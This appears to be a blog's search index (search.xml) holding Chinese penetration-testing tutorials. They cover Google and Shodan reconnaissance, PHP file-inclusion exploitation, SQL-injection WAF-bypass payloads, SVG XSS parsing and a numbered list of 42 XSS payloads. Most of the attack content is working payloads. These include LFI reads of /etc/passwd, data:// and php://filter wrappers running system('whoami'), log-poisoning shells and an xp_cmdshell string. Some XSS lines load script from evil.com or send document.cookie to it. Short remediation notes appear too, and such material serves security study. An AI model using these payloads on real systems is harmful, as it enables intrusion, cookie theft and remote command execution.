<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[搜索引擎——永不过时的渗透神器]]></title>
    <url>%2F2018%2F12%2F03%2F%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E2%80%94%E2%80%94%E6%B0%B8%E4%B8%8D%E8%BF%87%E6%97%B6%E7%9A%84%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[Google Hacking使用Google搜索引擎或其他Google应用程序通过特定语法来查找网站配置或代码中的安全漏洞搜索登录后台、特定文件、漏洞贡面、错误信息等等 逻辑运算符： +强制搜索其后的一个单词 -把某个字忽略 ~ 同意词博客设置 .单一的通配符 * 通配符，可代表多个字母 “” 精确查询 I 或 OR 只要符合多个关键字中的任意一个的结果予以显示 基本语法：intext:key 搜索网页带有关键字的页面 allintext:key 功能与intext，但是可以接多个关键字 intitle:key 搜索网页标题中是否有所输入的文字 allintitle:key 功能与intext，可以接多个关键字，但不能与别的关键字连用 Index of/(例如：index of/login) 使用它可以直接进入网站首页下的所有文件和文件夹中。（可以查看有没有目录遍历漏洞） cache:url 查看指定URL快照 filetype： 搜索指定类型文件 info： 搜索输入URL的摘要信息和其他相关信息，不能与其他关键词混用 inurl： 搜索输入字符是否存在于URL中，可以与site结合找后台 site： 搜索特定网站或者子域名 related:URL 搜索与该URL相关的页面 Link： link:thief.one可以返回所有和thief.one做了链接的URL。 搜索不同地域网站 inurl:tw 台湾 inurl:jp 日本 Google hacking语法数据库https://www.exploit-db.com/google-hacking-database/ 利用Google搜索C段服务器信息site:218.87.21.* 通过google可获取218.87.21.0/24网络的服务信息。 网络空间搜索引擎网络空间搜索引擎不同于搜索普通网页，而是直接搜索网络中存在主机，将主机信息汇聚成数据库，然后显示出主机的IP、端口、中间件、摄像头，工控设备banner、等其他网络设备信息。 同时可以按照普通搜索引擎规则来搜索网络设备：ip:&quot;192.168.1.0&quot;。 常见的搜索引擎：用法大多相同，这里只写shodan的用法。其他类比。 国内： zoomeye：（https://www.zoomeye.org/） fofa 国外： shodan（俗称黑暗谷歌） shodanhttps://www.shodan.io/ shoadn一刻不停的寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。 凡是链接到互联网的红绿灯、安全摄像头、家庭自动化设备以及加热系统等等都会被轻易的搜索到 shodan可以在windows下网页中运行，也可以在linux下安装运行。 基本语法： hostname： 搜索指定的主机或域名，例如 hostname:”google” port： 搜索指定的端口或服务，例如 port:”21” country： 搜索指定的国家，例如 country:”CN” city： 搜索指定的城市，例如 city:”Hefei” org： 搜索指定的组织或公司，例如 org:”google” isp： 搜索指定的ISP供应商，例如 isp:”China Telecom” product： 搜索指定的操作系统/软件/平台，例如 product:”Apache httpd” version： 搜索指定的软件版本，例如 version:”1.6.2” geo： 搜索指定的地理位置，例如 vgeo:”31.8639, 117.2808” before/after： 搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”v net： 搜索指定的IP地址或子网，例如 net:”210.45.240.0/24” http.favicon.hash方法可以来搜索使用同一icon图标的网站。如果我想搜索带有这个icon的所有ip地址的话，可以先在Shodan搜索这个ip，这里要用到一个之前没注意到的东西，就是Shodan的原始数据（Raw Data）功能， 这里面有很多原始数据。 从中找到相应：data.0.http.favicon.hash字段 通过命令： http.favicon.hash:600245583 命令： net:&quot;114.242.146.0/24&quot; 命令： os:&quot;windows 7&quot; country:&quot;CN&quot; city:&quot;beijing&quot; 不仅可以运用标准操作。还可以直接搜索功能 在linux下得先对shodan进行安装pip install shodan 然后初始化shodan shodan init ‘key’ 这里的key是注册shodan账号时候给你的 count：统计结果 download：下载数据，数据格式json shodan parse --fields ip_str,port waiwang.json parse：解析json数据。 而且只取ip_str和port字段的值 shodan parse --fields ip_str,port waiwang.json |grep 80 shodan host 114.242.146.192 host：搜索指定IP shodan myip shodan search --fields ip_str,port net:&apos;114.242.146.0/24&apos; search：搜索内容]]></content>
      <categories>
        <category>Google Hacking</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[内网渗透]]></title>
    <url>%2F2018%2F12%2F02%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞详解]]></title>
    <url>%2F2018%2F12%2F02%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。 常见的导致文件包含（文件读取）的函数如下： PHP： include()：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。 require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。 require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。 当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。 接下来的测试会用下面这个非常简单的代码进行： &lt;?php $file = $_GET[&apos;file&apos;]; include $file; ?&gt; 同目录下有一个phpinfo.txt文件（内容为&lt;?php phpinfo();?&gt;） 文件包含有两种：本地文件包含、远程文件包含 （即加载远程文件，在php.ini中开启allow_url_include、allow_url_fopen选项。开启后可以直接执行任意代码。） 漏洞成因：程序开发人员通常出于灵活性的考虑，会将被包含的文件设置成变量，然后动态调用这些文件。但正是因为调用的灵活性导致用户可能调用一些恶意文件，造成文件包含漏洞。 具有相关的文件包含函数。 文件包含函数中存在动态变量，比如 include $file;。 攻击者能够控制该变量，比如$file = $_GET[‘file’];。 php的文件包含利用在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。 读取敏感文件访问：http://www.test.com/index.php?test=/etc/passwd,如果目标主机存在该文件，并且具有读权限，那么就可以读出文件内容。 远程包含shell allow_url_fopen = On allow_url_include = On 在远程文件http://10.60.17.60里写入测试代码。 &lt;?php fputs(fopen(&quot;text.php&quot;, &quot;w&quot;), &quot;&lt;?php phpinfo(); ?&gt;&quot;) ?&gt; 访问http://127.0.0.1/123.php?file=http://10.60.17.46/phpinfo.php。将会在网站根目录下生成text.php文件，内容就是：”&lt;?php phpinfo(); ?&gt;“ 图片上传并包含图片shell利用方法和上面的一样，只是这次是本地包含，直接在上传的图片中写入测试代码并访问图片地址即可。 SSH log利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost 之后会提示输入密码等等，随便输入。 然后在remotehost的ssh-log中即可写入php代码： 之后进行文件包含即可。 包含日志文件GetShell利用条件：需要知道服务器日志的存储路径，且日志文件可读。 既然存在文件包含漏洞就可以利用漏洞读取apache的配置文件找到日志文件的位置。（默认：包含日志文件GetShell） 很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。 但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改. 正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。 在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。 长度截断利用条件： php版本 &lt; php 5.2.8 目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./ index.php?file=././././省略././shell.txt 0字节截断包含利用条件： php版本 &lt; php 5.3.4 测试代码： &lt;?php $file = $_GET[&apos;file&apos;]; include $file.&apos;/tasdas/asd.php&apos;; ?&gt; http://127.0.0.1/123.php?file=phpinfo.txt%00 正常上传图片一句话并访问：http://test.com/index.php?test=1.jpg会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入http://test.com/index.php?test=1.jpg%00，就极有可能会绕过检测。这种方法只适用于php.ini中magic_quotes_qpc=off并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。 伪协议PHP伪协议其实就是PHP支持的协议和封装的协议， file: — 访问本地文件系统 http: — 访问 HTTP(s) 网址 ftp: — 访问 FTP(s) URLs php: — 访问各个输入/输出流（I/O streams）【php://stdin 是只读的， php://stdout 和 php://stderr 是只写的】 zlib: — 压缩流 data: — 数据（RFC 2397） glob: — 查找匹配的文件路径模式 phar: — PHP 归档 ssh2: — Secure Shell 2 rar: — RAR ogg: — 音频流 expect: — 处理交互式的流 有两个比较重要的配置在php.ini中，allow_url_fopen 和allow_url_include会影响到fopen和include等等函数对于伪协议的支持，而allow_url_include依赖allow_url_fopen，所以allow_url_fopen不开启的话，allow_url_include也是无法使用的。 File://用于访问文件系统。（可用于任意文件执行），在allow_url_fopen 和allow_url_include任何状态下都可以用。 data:// php版本大于等于php5.2 allow_url_fopen = On allow_url_include = On http://127.0.0.1/123.php?file=data:text/plain,&lt;?php phpinfo();?&gt; 任意命令执行 http://127.0.0.1/123.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt; 利用base64编码绕过 http://127.0.0.1/123.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt; phar://php版本大于等于php5.3.0 在网站根目录下有一个phpinfo.txt内容为&lt;?php phpinfo();?&gt;，打包成压缩包。 使用绝对路径： http://127.0.0.1/123.php?file=phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt 或者使用相对路径： http://127.0.0.1/123.php?file=phar://phpinfo.zip/phpinfo.txt zip:// – zlib:// –bzip2:// –zip://php版本大于等于php5.3.0 构造zip包的方法同phar 但是使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。 http://127.0.0.1/123.php?file=zip://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt http://127.0.0.1/123.php?file=zip://phpinfo.zip%23phpinfo.txt http://127.0.0.1/123.php?file=zip://./phpinfo.zip%23phpinfo.txt 压缩流：在allow_url_fopen 和allow_url_include任何状态下都可以用。 使用方法： http://127.0.0.1/test/1.php?f=zip://./1.zip%231.txt http://127.0.0.1/test/1.php?f=zip:///Applications/MAMP/htdos/test/1.zip%231.txt http://127.0.0.1/test/1.php?f=file=compress.bzip2:///Applications/MAMP/htdos/test/file.jpg http://127.0.0.1/test/1.php?f=file=compress.bzip2://./file.jpg 另一种思路：将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩，压缩文件 名为file.zip，如果可以上传zip文件便直接上传，如果不能则将file.zip重命名为file.jpg后上传，其他几种压缩格式也可以这样操作。 PHP://inputallow_url_include = On。 对allow_url_fopen不做要求。 可以访问请求的原始数据，简单来说POST请求下，php://input可以获取到post数据，如果enctype=”multipart/form-data” 的时候 php://input 是无效的。 php://outputphp://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。 php://filter对allow_url_include 和allow_url_fopen不做要求。 在任意文件读取或者getshell会用到这个伪协议。 http://127.0.0.1/123.php?file=php://filter/read=convert.base64-encode/resource=auth.php 通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。 http://127.0.0.1/123.php?file=php://filter/convert.base64-encode/resource=auth.php 效果跟前面一样，少了read关键字。在绕过一些waf时也许有用。 php://filter类似于readfile()、file()、file_get_contents(),在数据流内容读取之前没有机会应用其他过滤器。 在include函数使用上，经常会造成任意文件读取漏洞，而file_get_contents()和file_put_contents()这样函数下，常常会构成getshell等更严重的漏洞。 php://filter 目标使用以下的参数作为它路径的一部分: resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 目录遍历现在在C:\phpStudy\PHPTutorial\phpinfo.txt文件中有php代码&lt;?php phpinfo();?&gt;，则利用../可以进行目录遍历。 http://127.0.0.1/123.php?file=../phpinfo.txt 实际拼接路径为：C:\phpStudy\PHPTutorial\WWW..\phpinfo.txt即C:\phpStudy\PHPTutorial\phpinfo.txt 编码绕过服务器端常常会对于 ../ 等做一些过滤，可以用一些编码来进行绕过。 利用url编码 ../： %2e%2e%2f ..%2f %2e%2e/ ..\： %2e%2e%5c ..%5c %2e%2e\ 二次编码 ../： %252e%252e%252f ..\： %252e%252e%255c 容器/服务器的编码方式 ../： ..%c0%af %c0%ae%c0%ae/（java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）） ..\： ..%c1%9c 利用协议测试代码： &lt;?php $file = $_GET[&apos;file&apos;]; include $file.&apos;/test/test.php&apos;; ?&gt; 构造压缩包结构如下： http://127.0.0.1/1.php?file=zip://C:\phpStudy\PHPTutorial\WWW\test.zip%23test http://127.0.0.1/1.php?file=phar://C:\phpStudy\PHPTutorial\WWW\test.zip 利用zip协议，注意要指定绝对路径 则拼接后为：zip://C:\phpStudy\PHPTutorial\WWW\test%23test/test/test.php 变量覆盖$$导致的变量覆盖，举个例子 $key = ‘hello’ $hello = ‘world’ echo $$key 输出world 文件包含修复方案 禁止远程文件包含： allow_url_include=off 配置 open_basedir=指定目录，限制访问区域。 过滤../等特殊符号 修改Apache日志文件的存放地址 开启魔术引号 magic_quotes_qpc=on 尽量不要使用动态变量调用文件，直接写要包含的文件]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL的WAF绕过]]></title>
    <url>%2F2018%2F12%2F02%2FSQL%E7%9A%84WAF%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[WAF主要针对HTTP（S）数据包进行解析从而提取相关的字段。 WAF的功能 审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话 访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式 架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。 WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。 WAF常见特点 异常检测协议：拒绝不符合HTTP标准的请求 增强的输入验证：代理和服务端的验证，而不只是限于客户端验证 白名单&amp;黑名单：白名单适用于稳定的Web应用，黑名单适合处理已知问题 基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活 状态管理：重点进行会话保护 另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等 WAF识别扫描器 1) 扫描器指纹(head字段/请求参数值)，以awvs为例，会有很明显的Acunetix在内的标识 2) 单IP+ cookie某时间段内触发规则次数 3) 隐藏的链接标签等(&lt;a&gt;) 4） Cookie植入 5) 验证码验证，扫描器无法自动填充验证码 6) 单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏 WAF绕过思路根据WAF部署位置，针对WAF、WEB服务器、WEB应用对协议解析、字符解析、文件名解析、编码解析以及SQL语法解析的差异，绕过WAF，将payload送至服务器执行。 大小写绕过这个大家都很熟悉，对于一些太垃圾的WAF效果显著，比如拦截了union，那就使用Union、UnIoN等等绕过。 编码绕过比如WAF检测关键字，那么我们让他检测不到就可以了。比如检测union，那么我们就用%55也就是U的16进制编码来代替U，union写成 %55nION，结合大小写也可以绕过一些WAF，你可以随意替换一个或几个都可以。 也还有大家在Mysql注入中比如表名或是load文件的时候，会把文件名或是表明用16进制编码来绕过WAF都是属于这类。 ####（1）URL编码： 在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29，/为%25。 普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过： ?id=1%252f%252a*/UNION%252f%252a /SELECT————————&gt;经过两次URL解码= ?id=1/**/UNION/* /SELECT ####（2）十六进制编码： /index.php?page_id=-15/*!u%6eion*//*!se%6cect*/ 1,2,3,4，SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) 示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点 ####（3）Unicode编码： Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了 常用的几个符号的一些Unicode编码： 单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7 空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0 左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8 右括号：%u0029、%uff09、\c0%29、\c0%a9、%e0%80%a9 ?id=10%D6&apos;%20AND%201=2%23 SELECT &apos;Ä&apos;=&apos;A&apos;; #1 一：前者利用宽字节绕过，比如对单引号转义操作变成\’，那么就变成了%D6%5C’，%D6%5C构成了一个宽字节即Unicode字节，单引号可以正常使用 二：示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过 三：另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过 替换关键字这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过。 index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4 建议不要对此抱有太大希望…. 使用注释常见的注释符： // -- /**/ # --+ -- - ; --a （1）普通注释index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4&apos;union%a0select pass from users# /**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别; #、–+用于终结语句的查询 （2）内联注释相比普通注释，内联注释用的更多，它有一个特性/*! */只有MySQL能识别(/*! */表示注释里面的语句会被执行) 实例一： ?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3 实例二： ?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4… 两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点当然前提是包括/、*在内的这些字符能正常使用 等价函数与命令有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用 ####（1）函数或变量 hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() 比如substr()被过滤了可以用mid()和left()、right()等函数。 substr((select &apos;password&apos;),1,1) = 0x70 strcmp(left(&apos;password&apos;,1), 0x69) = 1 strcmp(left(&apos;password&apos;,1), 0x70) = 0 strcmp(left(&apos;password&apos;,1), 0x71) = -1 ####（2）符号 and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那边是等于了。在看一下用得多的空格，可以使用如下符号表示其作用：%20、%09、%0a、%0b、%0c、%0d、/**/ ####（3）生僻函数 MySQL/PostgreSQL支持XML函数： Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’); ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1)) SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror)); //postgresql ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制。 特殊符号乌云drops上“waf的绕过技巧”一文使用的几个例子： 使用反引号`，例如select `version()`，可以用来绕过空格和正则，特殊情况下还可以将其做注释符用 神奇的-+.，select+id-1+1.from users; +是用于字符串连接的，-和.在此也用于连接，可以逃过空格和关键字过滤 @符号，select@^1.from users; `@用于变量定义如@var_name，一个@表示用户定义，@@`表示系统变量 select-count(id)test from users; //绕过空格限制 部分可能发挥大作用的字符(前文中没怎么说到的): ` ~ ! @ % () [] . - + | %00 关键字拆分： ‘se’+’lec’+’t’ %S%E%L%E%C%T 1 ?id=1;EXEC(‘ma’+&apos;ster..x’+&apos;p_cm’+&apos;dsh’+&apos;ell ”net user”’) !和()： &apos; or --+2=- -!!!&apos;2 id=1+(UnI)(oN)+(SeL)(EcT) 使用这些”特殊符号”实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段 HTTP参数控制这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制 HPP(HTTP Parameter Polution)（重复参数污染）/?id=1;select+1,2,3+from+users+where+id=1— /?id=1;select+1&amp;id=2,3+from+users+where+id=1— /?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的Web服务器处理方式。 具体WAF如何处理，要看其设置的规则，不过就示例中最后一个来看有较大可能绕过 HPF(HTTP Parameter Fragment)（HTTP分割注入）这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行) /?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users-- select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users— 缓冲区溢出缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过。 ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。 一些整合绕过的例子：id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*!information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– - ?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e-- index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4… 单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少 过滤掉and和or情况下的盲注假如有这样一个注入点 index.php?uid=123 但是and和or被过滤掉了，我们可以构造一下语句 index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123 123的时候页面是正确的，我们现在在盲猜hash的第一位，如果第一位等于0x42也就是B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是B，就这样猜，不用and和or了。 加括号/?id=1+union+(select+1,2+from+users) 如果上面一条被WAF拦截了，可以试着加一些括号。 /?id=1+union+(select+1,2+from+xxx) /?id=(1)union(select(1),mid(hash,1,32)from(users)) /?id=1+union+(select&apos;1&apos;,concat(login,hash)from+users) /?id=(1)union(((((((select(1),hex(hash)from(users)))))))) /?id=(1)or(0x50=0x50) 修复方案：1、如果可能，采用基于IP的白名单； 2、对各种不能解析的内容，全部禁止访问； 3、解析的协议，要全面； 4、对各种不符合标准模式的访问，禁止； 5、WAF解析方式，与后台的WEB服务器、web应用、数据库的解析方式尽可能一致； 6、关键字的匹配，需要考虑诸多变形情况。]]></content>
      <categories>
        <category>SQL</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SVG XSS黑魔法]]></title>
    <url>%2F2018%2F12%2F02%2FSVG-XSS%E9%BB%91%E9%AD%94%E6%B3%95%2F</url>
    <content type="text"><![CDATA[先来看两个代码，一个可执行一个不可执行。 可执行： &lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 不可执行： &lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 那么为啥加了&lt;svg&gt;的可以执行？ 这就得由html解析流程说起了。 html解析到&lt;svg&gt;的时候会变成标签开始状态(Tag open state)，然后到标签名状态(Tag name state)，等等，最终到数据状态(Data state)，并释放当前标签的token，当解析器处于数据状态(Data state)时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 svg属于外部元素。 外部元素来源于MathML和SVG命名空间。 而MathML（数学标记语言）是一种基于XML的标准。 那么可以猜测&lt;svg&gt;遵循XML和SVG的定义。 在XML中，&amp;#40;会被解析成( 在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体 &lt;xml&gt; &lt;name&gt;aaa&lt;/name&gt; &lt;value&gt;aaaaaaa&amp;#40;&lt;/value&gt; &lt;/xml&gt; 当然，SVG标准中也定义了script标签的存在。 所以，这个XSS之所以能够执行是因为遵循了svg及xml的标准]]></content>
      <categories>
        <category>XSS</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS测试用例]]></title>
    <url>%2F2018%2F12%2F01%2FXSS%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[1.&lt;script&gt; alert(1);&lt;/script&gt; 2.&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; 3.&lt;script src=&quot;http://www.evil.com/cookie.php&quot;&gt;&lt;/script&gt; 4.&lt;script&gt;location.href=&quot;http://www.evil.com/cookies.php?cookie=&quot;+escape(document.cookie)&quot;&lt;/script&gt; 5.&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt; 6.&lt;img src=liu.jpg onerror=alert(/xss/)/&gt; 7.&lt;style&gt;@im\port&#39;\ja\vasc\ript:alert(\&quot;xss\&quot;)&#39;;&lt;/style&gt; 8.&lt;?echo(&#39;&lt;src)&#39;; echo(&#39;ipt&gt;alert(\&quot;xss\&quot;)&#39;;&lt;/script&gt;&#39;);?&gt; 9.&lt;marquee&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/marquee&gt; 10.&lt;IMG SRC=\&quot;jav&amp;#0x9;ascript:alert(&#39;xss&#39;);\&quot;&gt; 11.&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt; 12.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 13.&lt;script src=http://www.evil.com/files.js&gt;&lt;/script&gt; 14.&lt;/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 15.&lt;/textarea&gt;&lt;script&gt;alert(/xss)&lt;/script&gt; 16.&lt;IMG LOWSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt; 17.&lt;IMG DYNSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt; 18.&lt;font style=&#39;color:expression(alert(document.cookie))&#39;&gt; 19.&#39;);alert(&#39;XSS 20.&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt; 21.[url=javascript:alert(&#39;XSS&#39;);]click me[/url] 22.&lt;body onunload=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; 23.&lt;body onLoad=&quot;alert(&#39;XSS&#39;);&quot; 24.[color=red&#39; onmouseover=&quot;alert(&#39;XSS&#39;)&quot;]mouse over[/color] 25.&quot;/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt; 26.window.alert(&quot;XSS&quot;); 27.&lt;div style=&quot;x:expression((window==1)?&quot;:eval(&#39;r=1;alert(String.fromCharCode(83,83,83));&#39;))&quot;&gt; 28.&lt;iframe&lt;?php eval chr(11)?&gt;onload=alert(&#39;XSS&#39;)&gt;&lt;/iframe&gt; 29.&quot;&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;30.&#39;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;h1&gt;&lt;/marquee&gt; 31.&#39;&quot;&gt;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 32.&#39;&quot;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt; 33.&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt; 34.&lt;META HTTP-EQUIV=\&quot;refresh\&quot;CONTENT=\&quot;0;URL=http://;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt; 35.&lt;script&gt;var var=1; alert(var)&lt;/script&gt; 36.&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt; 37.&lt;?=&#39;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;?&gt; 38.&lt;IMG SRC=&#39;vbscript:msgbox(\&quot;XSS\&quot;)&#39;&gt; 39.&quot;onfocus=alert(document.domain)&quot;&gt;&lt;&quot; 40.&lt;FRAMESET&gt;&lt;FRAME SRC=\&quot;javascript:alert(&#39;XSS&#39;);\&quot;&gt;&lt;/FRAMESET&gt; 41.&lt;STYLE&gt;li {list-style-image:url(\&quot;javascript:alert(&#39;XSS&#39;)\&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS 42.&lt;br size=\&quot;&amp;{alert(&#39;xss&#39;)}\&quot;&gt; 